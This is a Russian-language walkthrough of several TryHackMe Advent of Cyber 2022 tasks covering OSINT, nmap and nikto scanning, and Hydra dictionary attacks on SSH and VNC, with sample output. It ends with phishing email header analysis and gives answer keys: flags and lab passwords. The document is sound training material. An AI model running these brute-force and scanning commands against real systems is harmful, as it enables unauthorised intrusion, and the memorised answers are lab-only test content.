платежные и технические контакты в централизованной базе данных. База данных общедоступна для поиска по любому 
домену и позволяет получать персональную идентификационную информацию (PII) компании, такую как адрес электронной 
почты, номер мобильного телефона и т. д. технического контакта. Злоумышленники могут впоследствии использовать эту 
информацию для профилирования, фишинговых кампаний (направленных на выбранных лиц) и т. д. В настоящее время 
регистраторы предлагают опции конфиденциальности домена, которые позволяют пользователям сохранять 
конфиденциальность своей информации WHOIS от широкой публики и доступной только определенным субъектам, таким как 
назначенные регистраторы.        

Несколько веб-сайтов позволяют проверять информацию WHOIS на веб-сайте. Например, вы можете проверить информацию 
WHOIS на github.com этом бесплатном веб-сайте.  


#### Роботы.txt
Файл robots.txt является общедоступным файлом, созданным администратором веб-сайта и предназначенным для того, чтобы 
поисковые системы могли разрешать или запрещать индексацию URL-адресов веб-сайта. Все веб-сайты имеют свой файл 
robots.txt, доступный напрямую через основной URL-адрес домена. Это своего рода механизм связи между веб-сайтами и 
поисковыми роботами.  Поскольку файл является общедоступным, это не означает, что кто-либо может редактировать или 
изменять его.  Вы можете получить доступ к robots.txt, просто добавив robots.txt в конец URL-адреса веб-сайта. 
Например, в случае Google мы можем получить доступ к файлу robots.txt, щелкнув этот URL-адрес .     



Мы видим, что Google разрешил и запретил определенные URL для веб-скрейперов и поисковых систем. Параметр disallow 
помогает злоумышленникам идентифицировать конфиденциальные каталоги, к которым можно получить доступ вручную и 
которые можно использовать, например, панель администратора, папка журналов и т. д.   

#### Поиск взломанной базы данных
Крупные социальные сети и технологические гиганты в прошлом страдали от утечек данных. В результате утечка данных 
становится общедоступной и в большинстве случаев содержит PII, такую как имена пользователей, адреса электронной 
почты, номера мобильных телефонов и даже пароли. Пользователи могут использовать один и тот же пароль на всех 
веб-сайтах; это позволяет злоумышленникам повторно использовать тот же пароль против пользователя на другой 
платформе для полного захвата учетной записи. Многие веб-сервисы предлагают проверить, есть ли ваш адрес электронной 
почты или номер телефона в утекшей базе данных; HaveIBeenPwned — один из бесплатных сервисов.
Изображение для взлома базы данных
Elf Recon McRed попытался проверить все адреса электронной почты веб-сайта магазина подарков Санты, чтобы выявить 
любую утечку, и, к счастью, никакой утечки данных обнаружено не было.  

#### Поиск в репозиториях GitHub
GitHub — известная платформа, которая позволяет разработчикам размещать свой код с помощью контроля версий. 
Разработчик может создать несколько репозиториев и также задать настройки конфиденциальности. Распространенным 
недостатком разработчиков является то, что конфиденциальность репозитория устанавливается как публичная, что 
означает, что любой может получить к нему доступ. Эти репозитории содержат полный исходный код и, в большинстве 
случаев, включают пароли, токены доступа и т. д.     


Макред, мастер разведки, искал различные термины на GitHub, чтобы найти что-то полезное, например SantaGiftShop, 
SantaGift,  SantaShop и т. д. К счастью, один из терминов сработал, и он нашел полный исходный код веб-сайта, 
общедоступный через OSINT.    
### Ответить на вопросы ниже
Каково имя регистратора домена santagift.shop?

```commandline
NAMECHEAP INC
```
Найдите исходный код веб-сайта (репозиторий) на  github.com  и откройте файл, содержащий конфиденциальные учетные 
данные. Вы можете найти флаг? 

```commandline
{THM_OSINT_WORKS}
```
Как называется файл, содержащий пароли?

```commandline
config.php
```
Как называется сервер контроля качества, связанный с веб-сайтом?

```commandline
qa.santagift.shop
```
Какой параметр DB_PASSWORD повторно используется между средами QA и PROD?

```commandline
S@nta2022
```
Посетите эту комнату, если вы хотите узнать больше о Google Dorking! 
```commandline
Ответ не нужен
```

## Задание 9
Посмотрите видео-обзор HuskyHack для 4-го дня  здесь !

В ходе расследования загруженного репозитория GitHub ( задача OSINT ) эльф Recon McRed обнаружил URL-адрес, qa.
santagift.shop который, вероятно, используется всеми эльфами с правами администратора для добавления или удаления 
подарков на веб-сайте Санты. Веб-сайт был закрыт на техническое обслуживание, и теперь Recon McRed сканирует сервер, 
чтобы выяснить, как он был скомпрометирован.  Можете ли вы помочь McRed просканировать сеть и найти причину 
компрометации веб-сайта?    

### Цели обучения
- Что такое сканирование?
- Типы сканирования
- Методы сканирования
- Инструменты сканирования
### Что такое сканирование?
Сканирование — это набор процедур для идентификации работающих хостов, портов и служб, обнаружения операционной 
системы целевой системы и выявления уязвимостей и угроз в сети. Эти сканирования обычно автоматизированы и дают 
представление о том, что может быть использовано. Сканирование раскрывает части поверхности атаки для 
злоумышленников и позволяет запускать целевые атаки для использования системы.   

### Типы сканирования
Сканирование классифицируется как активное или пассивное в зависимости от степени вмешательства в сбор информации о 
целевой системе или сети, как поясняется ниже:  
- Пассивное сканирование: этот метод подразумевает сканирование сети без прямого взаимодействия с целевым устройством 
(сервером, компьютером и т. д.). Пассивное сканирование обычно выполняется с помощью инструментов захвата и анализа 
  пакетов, таких как Wireshark; однако этот метод предоставляет только базовую информацию об активах, такую как 
  версия ОС , сетевой протокол и т. д., в отношении цели.  
- Активное сканирование: активное сканирование — это метод сканирования, при котором вы сканируете отдельные конечные 
точки в ИТ-сети для получения более подробной информации. Активное сканирование подразумевает отправку пакетов или 
запросов непосредственно на определенные активы, а не пассивный сбор этих данных путем «перехвата» их в пути в 
сетевом трафике. Активное сканирование — это немедленное глубокое сканирование, выполняемое на целях для получения 
подробной информации. Этими целями могут быть одна конечная точка или сеть конечных точек.    
### Методы сканирования
Для эффективного сканирования целевой системы или сети применяются следующие стандартные методы.

### Сканирование сети
Сеть обычно представляет собой набор взаимосвязанных хостов или компьютеров для обмена информацией и ресурсами. 
Сканирование сети помогает обнаружить и сопоставить полную сеть, включая любой работающий компьютер или хосты, 
открытые порты, IP-адреса и службы, работающие на любом работающем хосте и операционной системе. После того, как 
сеть сопоставлена, злоумышленник выполняет эксплойты в соответствии с обнаруженной целевой системой и службами. 
Например, компьютер в сети с устаревшей версией Apache позволяет злоумышленнику запустить эксплойт против уязвимого 
сервера Apache.     

### Сканирование портов
Согласно Википедии, «В компьютерных сетях порт — это номер, назначаемый для уникальной идентификации конечной точки 
соединения и направления данных в определенную службу. На программном уровне, в операционной системе, порт — это 
логическая конструкция, которая идентифицирует определенный процесс или тип сетевой службы ».  

Сканирование портов — это обычный метод проверки открытых портов в сети, способной принимать и отправлять данные. 
Сначала злоумышленник составляет карту всей сети с установленными устройствами/хостами, такими как брандмауэры, 
маршрутизаторы, серверы и т. д., затем сканирует открытые порты на каждом работающем хосте. Номер порта варьируется 
от 0 до 65 536 в зависимости от типа службы, запущенной на хосте. Результаты сканирования портов делятся на 
следующие три категории:    
- Закрытые порты : Хост не прослушивает определенный порт.
- Открытые порты : Хост активно принимает соединение через определенный порт.
- Фильтрованные порты : это означает, что порт открыт, однако хост не принимает соединения или принимает соединения в 
  соответствии с определенными критериями, такими как конкретный исходный IP-адрес.
### Сканирование уязвимостей
Сканирование уязвимостей проактивно выявляет уязвимости сети в автоматическом режиме, что помогает определить, может 
ли система быть под угрозой или эксплуатироваться. Доступны бесплатные и платные инструменты, которые помогают 
выявлять лазейки в целевой системе с помощью предварительно созданной базы данных уязвимостей. Пентестеры широко 
используют такие инструменты, как Nessus и Acunetix, для выявления лазеек в системе.   

### Инструменты сканирования
### Сетевой картограф ( Nmap )
Nmap — популярный инструмент, используемый для сканирования портов, обнаружения сетевых протоколов, определения 
запущенных служб и обнаружения операционных систем на живых хостах.  Вы можете узнать больше об этом инструменте, 
посетив комнаты Nmap ,  Nmap live host discovery , Nmap basic port scan  и  Nmap advanced port scan  на TryHackMe.  

Разверните виртуальную машину, нажав Start Machineв правом верхнем углу этой задачи.  Это машина, которую Recon 
McRed хочет просканировать. 

Вы можете получить доступ к необходимым инструментам, нажав Start AttackBoxкнопку выше. Подождите, пока загрузится 
AttackBox, и запустите терминал с рабочего стола. Введите nmapв терминале AttackBox. Ниже приведен краткий обзор 
важных опций Nmap:  
TCP SYN Scan : получить список активных хостов и связанных портов на хостах без завершениятрехстороннего TCP-nmap 
-sS MACHINE_IP рукопожатия и сделать сканирование немного более скрытным. Использование:. 

Терминал
```commandline
mcred@machine$ nmap -sS MACHINE_IP
Starting Nmap 7.60 ( https://nmap.org ) at 2022-11-08 07:05 GMT
Nmap scan report for ip-10-10-170-119.eu-west-1.compute.internal (10.10.170.119)
Host is up (0.0020s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  xxxx
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:B1:18:36:C7:07 (Unknown)
```


Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds
Ping Scan : позволяет сканировать активные хосты в сети, не углубляясь в проверку портов и т. д. Использование:  
nmap -sn MACHINE_IP. 
Сканирование операционной системы : позволяет сканировать тип ОС , работающей на работающем хосте. Использование: 
nmap -O MACHINE_IP. 
Обнаружение служб : получение списка запущенных служб на работающем хосте. Использование:nmap -sV MACHINE_IP

### Никто
Nikto — это программное обеспечение с открытым исходным кодом, позволяющее сканировать веб-сайты на наличие 
уязвимостей. Оно позволяет искать поддомены, устаревшие серверы, отладочные сообщения и т. д. на веб-сайте. Вы 
можете получить к нему доступ в AttackBox, набрав nikto -host MACHINE_IP.  

Терминал
```commandline
mcred@machine$ nikto -host MACHINE_IP:80
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          MACHINE_IP
+ Target Hostname:    ip-MACHINE_IP.eu-west-1.compute.internal
+ Target Port:        80
+ Start Time:         2022-11-08 08:34:50 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x5eca7b0d75572 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2022-11-08 08:35:00 (GMT0) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```


Elf Recon McRed запустил инструменты Nmap и Nikto против сервера QA, чтобы найти список открытых портов и 
уязвимостей. Он заметил запущенную службу Samba — хакеры могут получить доступ к системе через слабо защищенные 
папки общего доступа Samba, которые не защищены по сети. Он знает, что Bandit Yeti APT получила несколько списков 
имен пользователей и паролей администраторов для qa.santagift.shop использования методов OSINT.

Давайте подключимся к сервису Samba, используя учетные данные, которые мы нашли в исходном коде (задача OSINT). 
Введите следующую команду smb://MACHINE_IP в адресной строке и используйте следующее имя пользователя и пароль: 
Имя пользователя: ubuntu
Пароль: S@nta2022
Изображение для малого и среднего бизнеса

### Ответить на вопросы ниже
Каково имя HTTP-сервера, работающего на удаленном хосте?

```commandline
Apache
```
Как называется служба, работающая на порту 22 на сервере QA?

```commandline
ssh
```
Какой флаг вы увидите после успешного доступа к сервису Samba?

```commandline
{THM_SANTA_SMB_SERVER}
```
Какой пароль для имени пользователя santahr?

```commandline
santa25
```
Если вы хотите узнать больше о методах сканирования, у нас есть модуль, посвященный Nmap !
```commandline
Ответ не нужен
```

## Задание 10
Elf McSkidy попросил Elf Recon McRed поискать любой бэкдор, который мог установить Bandit Yeti APT . Если такой 
бэкдор будет найден, мы узнаем, что негодяи могут использовать его для доступа к системам в сети Санты. 
### Цели обучения
- Узнайте о распространенных службах удаленного доступа.
- Распознавание прослушиваемого порта VNC при сканировании портов.
- Используйте инструмент для поиска пароля VNC-сервера.
- Подключитесь к VNC-серверу с помощью VNC-клиента.
- Услуги удаленного доступа


Вы можете легко управлять своей компьютерной системой с помощью подключенной клавиатуры и мыши, когда вы находитесь 
  за компьютером. Как мы можем управлять компьютерной системой, которая физически находится в другом месте? 
  Компьютер может находиться в отдельной комнате, здании или стране. Необходимость удаленного администрирования 
  компьютерных систем привела к разработке различных программных пакетов и протоколов. Мы упомянем три примера:   
- SSH
- РДП
- VNC


SSH означает Secure Shell . Первоначально он использовался в Unix-подобных системах для удаленного входа. Он 
предоставляет пользователю интерфейс командной строки ( CLI ), который можно использовать для выполнения команд.  

RDP означает Remote Desktop Protocol (протокол удаленного рабочего стола ); он также известен как Remote Desktop 
Connection (RDC) или просто Remote Desktop (RD). Он предоставляет графический пользовательский интерфейс ( GUI ) для 
доступа к системе MS Windows. При использовании Remote Desktop пользователь может видеть свой рабочий стол и 
использовать клавиатуру и мышь, как будто он сидит за компьютером.   

VNC означает Virtual Network Computing (виртуальные сетевые вычисления). Он обеспечивает доступ к графическому 
интерфейсу, который позволяет пользователю просматривать рабочий стол и (опционально) управлять мышью и клавиатурой. 
VNC доступен для любой системы с графическим интерфейсом, включая MS Windows, Linux и даже macOS, Android и 
Raspberry Pi.

Исходя из наших систем и потребностей, мы можем выбрать один из этих инструментов для управления удаленным 
компьютером; однако в целях безопасности нам необходимо подумать о том, как мы можем подтвердить свою личность 
удаленному серверу.  

### Аутентификация
Аутентификация относится к процессу, в котором система проверяет вашу личность. Процесс начинается с того, что 
пользователь заявляет о своей уникальной личности, например, о том, что он является владельцем определенного имени 
пользователя. Кроме того, пользователю необходимо подтвердить свою личность. Этот процесс обычно достигается одним 
или несколькими из следующих способов:

- Под чем-то, что вы знаете, обычно понимается то, что вы можете запомнить, например, пароль или ПИН-код 
(персональный идентификационный номер). 
- Что-то, что у вас есть, относится к чему-то, чем вы владеете, аппаратному или программному обеспечению, например, 
  токену безопасности, мобильному телефону или файлу ключа. Токен безопасности — это физическое устройство, 
  отображающее номер, который периодически меняется. 
- Что-то, что вы делаете, относится к биометрической аутентификации, например, при использовании сканера отпечатков 
  пальцев или сканирования сетчатки глаза.
Возвращаясь к службам удаленного доступа, мы обычно используем пароли или файлы закрытых ключей для аутентификации. 
  Использование пароля является методом аутентификации по умолчанию и требует наименьшего количества шагов для 
  настройки. К сожалению, пароли подвержены множеству атак.  

Эльф Рекон Макред

### Атака паролей
Пароли являются наиболее часто используемыми методами аутентификации. К сожалению, они подвержены различным атакам. 
Некоторые атаки не требуют никаких технических навыков, например, серфинга через плечо или подбора пароля. Другие 
атаки требуют использования автоматизированных инструментов.  

Ниже приведены некоторые способы, используемые при атаках на пароли:

- Shoulder Surfing: Взгляд через плечо жертвы может раскрыть схему, которую она использует для разблокировки своего 
телефона, или PIN-код для использования банкомата. Эта атака требует минимума технических знаний.
- Угадывание пароля: Без должной осведомленности о кибербезопасности некоторые пользователи могут быть склонны 
  использовать личные данные, такие как дата рождения или имя дочери, поскольку их легче всего запомнить. Угадывание пароля таких пользователей требует некоторых знаний личных данных цели; год их рождения может оказаться их PIN-кодом банкомата.
- Атака по словарю: этот подход расширяет возможности подбора пароля и пытается включить все допустимые слова в 
  словарь или список слов.
- Атака методом полного перебора: эта атака является наиболее исчерпывающей и трудоемкой, при которой злоумышленник 
  может перебрать все возможные комбинации символов.
Давайте сосредоточимся на атаках по словарю. Со временем хакеры составили один список за другим паролей, украденных 
  в результате утечек данных. Одним из примеров является список взломанных паролей RockYou, который вы можете найти 
  на AttackBox по адресу /usr/share/wordlists/rockyou.txt. Выбор списка слов должен зависеть от ваших знаний о цели. 
  Например, французский пользователь может использовать французское слово вместо английского. Следовательно, список 
  французских слов может оказаться более многообещающим.     

Список слов RockYou содержит более 14 миллионов уникальных паролей. Даже если мы хотим попробовать 5% лучших, это 
все равно больше полумиллиона. Нам нужно найти автоматизированный способ. 

### Взлом службы аутентификации
Чтобы запустить AttackBox и присоединенную виртуальную машину ( VM ), нажмите кнопку «Запустить AttackBox» и нажмите 
кнопку «Запустить машину». Пожалуйста, подождите пару минут, чтобы вы могли следить за всем происходящим. 

На AttackBox мы открываем терминал и используем Nmap для сканирования целевой машины IP-адреса MACHINE_IP. Окно 
терминала ниже показывает, что у нас есть две службы прослушивания, SSH и VNC. Давайте посмотрим, сможем ли мы 
узнать пароли, используемые для этих двух служб.  

Терминал AttackBox
```commandline
root@AttackBox# nmap -sS MACHINE_IP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 11:57 EET
Nmap scan report for MACHINE_IP
Host is up (0.081s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5900/tcp open  vnc

Nmap done: 1 IP address (1 host up) scanned in 2.28 seconds
```

Мы хотим автоматизированный способ перебрать общие пароли или записи из списка слов; вот вам THC Hydra. Hydra 
поддерживает множество протоколов, включая SSH, VNC, FTP, POP3, IMAP, SMTP и все методы, связанные с HTTP. Вы можете 
узнать больше о THC Hydra, присоединившись к комнате Hydra . Общий синтаксис командной строки следующий:  
```commandline
hydra -l username -P wordlist.txt server service
```
 где мы указываем следующие параметры:

- -l username: -lдолжно предшествовать username, т.е. имени входа цели. Вам следует опустить эту опцию, если служба 
не использует имя пользователя.
- -P wordlist.txt: -Pпредшествует wordlist.txtфайлу, содержащему список паролей, которые вы хотите попробовать с 
  указанным именем пользователя.
- server— имя хоста или IP-адрес целевого сервера.
- service указывает на службу, в которой вы пытаетесь запустить атаку по словарю.


Рассмотрим следующие конкретные примеры:
```commandline
hydra -l mark -P /usr/share/wordlists/rockyou.txt MACHINE_IP ssh 
```
будет использовать mark в качестве имени пользователя при переборе предоставленных паролей на сервере SSH.

```commandline
hydra -l mark -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP
```
идентичен предыдущему примеру. MACHINE_IP ssh то же самое, что и ssh://MACHINE_IP.
Вы можете заменить его ssh на другое имя протокола, например rdp, vnc, , ftp, pop3или на любой другой протокол, 
поддерживаемый Hydra .

Есть несколько дополнительных необязательных аргументов, которые вы можете добавить:

-V или -vV, для verbose, заставляет Hydra показывать комбинации имени пользователя и пароля, которые были опробованы.
Такая многословность очень удобна для наблюдения за прогрессом, особенно если вам все еще нужно быть более уверенным 
в синтаксисе командной строки. 
-d, для отладки, предоставляет более подробную информацию о том, что происходит. Отладочный вывод может избавить вас 
от многих разочарований; например, если Hydra попытается подключиться к закрытому порту и время ожидания истекло, 
-dэто будет немедленно обнаружено.  
В окне терминала ниже мы используем Hydra , чтобы найти пароль имени пользователя alexander, разрешающего доступ 
через SSH. 

Терминал AttackBox
```commandline
root@AttackBox# hydra -l alexander -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP -V
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-15 13:39:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://MACHINE_IP:22/
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "princess" - 6 of 14344399 [child 5] (0/0)
...
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "poohbear" - 111 of 14344402 [child 1] (0/3)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "patrick" - 112 of 14344402 [child 2] (0/3)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "iloveme" - 113 of 14344402 [child 6] (0/3)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "sakura" - 114 of 14344402 [child 7] (0/3)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "adrian" - 115 of 14344402 [child 15] (0/3)
[ATTEMPT] target MACHINE_IP - login "alexander" - pass "alexander" - 116 of 14344402 [child 4] (0/3)
[22][ssh] host: MACHINE_IP   login: alexander   password: sakura
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-15 13:41:01
```

Вы можете поэкспериментировать, повторив ту же команду `hydra -l alexander -P /usr/share/wordlists/rockyou.txt 
ssh://MACHINE_IP -V` на терминале AttackBox. Пароль имени пользователя alexander оказался sakura, 114-м в rockyou.
txt списке паролей. В задачах TryHackMe мы ожидаем, что любая атака завершится менее чем за пять минут; однако в 
реальных сценариях атака обычно занимает больше времени. Параметры детализации или отладки могут быть полезны, если 
вы хотите, чтобы Hydra информировала вас о ходе выполнения.    

### Подключение к VNC-серверу
Для подключения к VNC-серверу можно использовать множество клиентов. Если вы подключаетесь с AttackBox, мы 
рекомендуем использовать Remmina. Чтобы запустить Remmina, в меню Applications в правом верхнем углу щелкните группу 
Internet, чтобы найти Remmina.  

Remmina можно запустить из группы «Интернет» в меню «Приложения».

Если появится диалоговое окно с предложением разблокировать связку ключей для входа, нажмите «Отмена».

Если вас попросят разблокировать связку ключей для входа, нажмите «Отмена».

Нам необходимо выбрать протокол VNC и ввести IP-адрес целевой системы, как показано на рисунке ниже.

Чтобы подключиться к VNC-серверу с помощью Remmina, вам необходимо выбрать протокол VNC и ввести IP-адрес цели.

### Ответить на вопросы ниже
Используйте Hydra, чтобы найти пароль VNC цели с IP-адресом  MACHINE_IP. Какой пароль?
```commandline
1q2w3e4r
```
Используя VNC-клиент на AttackBox, подключитесь к цели IP-адреса  MACHINE_IP. Какой флаг написан на экране цели?

```commandline
THM{I_SEE_YOUR_SCREEN}
```
Если вам понравились темы, представленные в этом задании, посмотрите следующие комнаты: Протоколы и серверы 2,  
Гидра,  Атаки на пароли,  Джон Потрошитель.
```commandline
Ответ не нужен
```
## Задание 11
Elf McBlue обнаружил активность электронной почты при анализе файлов журнала. Похоже, все началось с электронной 
почты... 

### Цели обучения
- Узнайте, что такое анализ электронной почты и почему он по-прежнему важен.
- Изучите разделы заголовка электронного письма.
- Изучите основные вопросы, которые следует задавать при анализе электронной почты.
- Узнайте, как использовать разделы заголовков электронных писем для их оценки.
- Научитесь использовать дополнительные инструменты для обнаружения вложений в электронные письма и проведения 
  дальнейшего анализа.

### Помогите команде Elf расследовать полученное подозрительное электронное письмо.
Что такое анализ электронной почты?

Анализ электронной почты — это процесс извлечения информации из заголовка электронной почты для раскрытия сведений о 
файле электронной почты. Заголовок электронной почты содержит технические данные электронной почты, такие как 
отправитель, получатель, путь, обратный адрес и вложения. Обычно этих данных достаточно, чтобы определить, есть ли в 
электронной почте что-то подозрительное/необычное, и принять решение о дальнейших действиях с электронной почтой, 
таких как фильтрация/карантин или доставка. Этот процесс можно выполнить вручную и с помощью инструментов.    

При анализе электронной почты возникают две основные проблемы.

Вопросы безопасности: выявление подозрительных/ненормальных/вредоносных шаблонов в электронных письмах.
Проблемы с производительностью: выявление проблем с доставкой и задержками в электронных письмах.
В этой задаче мы сосредоточимся на проблемах безопасности электронных писем, также известных как фишинг. Прежде чем 
сосредоточиться на практическом анализе электронной почты, вам нужно будет ознакомиться с терминами «социальная 
инженерия» и «фишинг».  

- Социальная инженерия : Социальная инженерия — это психологическое манипулирование людьми с целью совершения или 
разглашения информации путем использования слабостей человеческой натуры. Этими «слабостями» могут быть любопытство, 
  ревность, жадность, доброта и готовность помочь кому-то. 
- Фишинг : Фишинг — это подраздел социальной инженерии, реализуемый через электронную почту с целью заставить 
  кого-либо раскрыть личную информацию и учетные данные или выполнить вредоносный код на его компьютере.
Фишинговые письма обычно  выглядят так, будто они исходят из надежного источника, будь то человек или компания. Они 
  содержат контент, который пытается соблазнить или обмануть людей, загрузив программное обеспечение, открыв 
  вложения или перейдя по ссылкам на поддельный веб-сайт. Вы можете найти больше информации о фишинге, заполнив 
  модуль фишинга .   

Имеет ли еще значение анализ электронной почты?
Да! Различные научные исследования и технические отчеты подчеркивают, что фишинговые атаки по-прежнему чрезвычайно 
распространены, эффективны и их трудно обнаружить. Это также часть тестирования на проникновение и внедрения Red 
Teaming (платные оценки безопасности, которые проверяют организационную кибербезопасность). Поэтому компетентность в 
анализе электронной почты по-прежнему является важным навыком. Сегодня различные инструменты и технологии упрощают и 
ускоряют анализ электронной почты. Тем не менее, опытный аналитик должен знать, как проводить ручной анализ, когда 
нет бюджета на автоматизированные решения.  Это также хороший навык для отдельных лиц и не связанных с 
безопасностью/ИТ-специалистов!      


Важное примечание: для работы глубокого анализа требуется изолированная среда. Рекомендуется загружать и выгружать 
полученные письма и вложения только в том случае, если вы входите в авторизованную команду и имеете изолированную 
среду. Предположим, вы находитесь вне соответствующей команды или являетесь обычным пользователем. В этом случае вы 
можете оценить заголовок письма, используя необработанный формат, и провести необходимые проверки, такие как 
отправитель, получатель, оценка спама и информация о сервере. Помните, что впоследствии вы должны сообщить об этом 
соответствующей команде.      

Как анализировать электронные письма?

Прежде чем изучать, как проводить анализ электронной почты, вам необходимо знать структуру заголовка электронной 
почты. Давайте быстро рассмотрим структуру заголовка электронной почты. 



Щелкните правой кнопкой мыши по образцу и откройте его в Sublime Text.
Откройте Sublime Text и перетащите образец в текстовый редактор.
Открыть файл электронной почты в текстовом редакторе



Если ваш файл имеет расширение ".eml" или ".msg" , sublime text автоматически определит структуру и выделит поля 
заголовка для удобства чтения. Обратите внимание, что если вы используете ".txt" или любое другое расширение, вам 
нужно будет вручную выбрать формат выделения с помощью кнопки, расположенной в правом нижнем углу.  


Изменить синтаксис подсветки

Текстовые редакторы полезны при анализе, но есть некоторые инструменты, которые могут помочь вам просмотреть детали 
письма в более понятном формате. В этой задаче мы будем использовать  инструмент "emlAnalyzer" для просмотра тела 
письма и анализа вложений. EmlAnalyzer  — это инструмент, предназначенный для разбора заголовков писем для лучшего 
просмотра и анализа процесса. Инструмент готов к использованию в данной виртуальной машине .  Инструмент может 
отображать заголовки, тело, встроенные URL-адреса, текстовые и HTML-данные, а также вложения. Пример запроса 
использования поясняется ниже.     



### Использование emlAnalyzer
```commandline
user@ubuntu$ emlAnalyzer -i Urgent\:.eml --header --html -u --text --extract-all
 ==============
 ||  Header  ||
 ==============
X-Pm-Content-Encryption.....end-to-end
X-Pm-Origin.................internal
Subject.....................Urgent: Blue section is down. Switch to the load share plan!
From........................[REDACTED]
Date........................[REDACTED]
Mime-Version................[REDACTED]
Content-Type................[REDACTED]
To..........................[REDACTED]
X-Attached..................[REDACTED]
Message-Id..................[REDACTED]
X-Pm-Spamscore..............[REDACTED]
Received....................[REDACTED]
X-Original-To...............[REDACTED]
Return-Path.................[REDACTED]
Delivered-To................[REDACTED]
 =========================
 ||  URLs in HTML part  ||
 =========================
[+] No URLs found in the html
 =================
 ||  Plaintext  ||
 =================
[+] Email contains no plaintext
 ============
 ||  HTML  ||
 ============
Dear Elves,.......
 =============================
 ||  Attachment Extracting  ||
 =============================
[+] Attachment [1] "Division_of_........
```

На этом этапе вы должны были выполнить следующие проверки.

- Контроль отправителя и получателя
- Управление обратным путем
- Управление почтовым сервером
- Управление идентификатором сообщения
- Контроль спама 
- Контроль вложений (Содержит ли электронное письмо какие-либо вложения?)
Кроме того, вы можете использовать некоторые инструменты Open Source Intelligence (OSINT) для проверки репутации 
  электронной почты и обогащения результатов. Посетите указанный ниже сайт и выполните проверку репутации адреса 
  отправителя и адреса, найденного в обратном пути.

### Инструмент: https://emailrep.io/
Проверка репутации электронной почты

Здесь, если вы обнаружите какие-либо подозрительные URL-адреса и IP-адреса, рассмотрите возможность использования 
некоторых инструментов OSINT для дальнейшего расследования. Хотя мы сосредоточимся на использовании Virustotal и 
InQuest, наличие аналогичных и альтернативных сервисов в наборе инструментов аналитика стоит того и выгодно.  

Примечание: не забудьте перейти к местоположению файла, прежде чем пытаться вычислить хэш-значение файла.

Использование emlAnalyzer
user@ubuntu$ sha256sum Division_of....
0827bb9a.... 


VirusTotal Получив сумму файла, вы можете приступить к дальнейшему анализу с помощью VirusTotal.

Инструмент:https://www.virustotal.com/gui/home/upload
Теперь посетите веб-сайт инструмента и воспользуйтесь SEARCHопцией проведения анализа репутации файла на основе хэша.
После получения результатов у вас будет несколько разделов, чтобы узнать больше о хэше и связанном файле. Разделы 
показаны ниже.  

### Разделы Virustotal

Поиск хэш-значения
Нажмите на BEHAVIOR вкладку.
Проанализируйте детали.
После этого продолжите проверку репутации на InQuest , чтобы обогатить собранные данные.



### Инструмент: https://labs.inquest.net/
Теперь посетите веб-сайт инструмента и воспользуйтесь INDICATOR LOOKUP возможностью проведения анализа на основе хэшей.

Поиск хэш-значения
Нажмите на значение хэша SHA256, выделенное желтым цветом, чтобы просмотреть подробный отчет.
Проанализируйте данные файла.


### InQuest
После завершения показанных шагов вы закончите начальный анализ электронной почты. Следующие шаги — создание отчета 
о результатах и информирование членов команды/менеджера в соответствующем формате.  


Теперь пришло время применить полученные знания на практике. Нажмите кнопку Start Machine в верхней части задачи, 
чтобы запустить виртуальную машину. Машина запустится в режиме разделенного экрана. Если виртуальная машина не видна,
используйте синюю кнопку Show Split View в правом верхнем углу страницы. Теперь вернемся к эльфу МакСкиди, 
анализирующему подозрительное письмо, которое могло помочь Bandit Yeti проникнуть в сеть Санты.



ВАЖНЫЕ ЗАМЕТКИ:
Данный образец электронного письма содержит вредоносное вложение.
Никогда не взаимодействуйте напрямую с неизвестными вложениями электронной почты за пределами изолированной среды.
### Ответить на вопросы ниже
Какой адрес электронной почты отправителя?

```commandline
chief.elf@santaclaus.thm
```
Какой обратный адрес?

```commandline
murphy.evident@bandityeti.thm
```
От чьего имени было отправлено электронное письмо?

```commandline
Chief Elf
```
Каков рейтинг X-спама?

```commandline
3
```
Что скрывается в значении поля Message-ID?

```commandline
AoC2022_Email_Analysis
```
Посетите веб-сайт проверки репутации электронной почты, указанный в задании.
Каков результат проверки репутации адреса электронной почты отправителя?

```commandline
RISKY
```
Проверьте вложения.
Каково имя файла вложения?

```commandline
Division_of_labour-Load_share_plan.doc
```
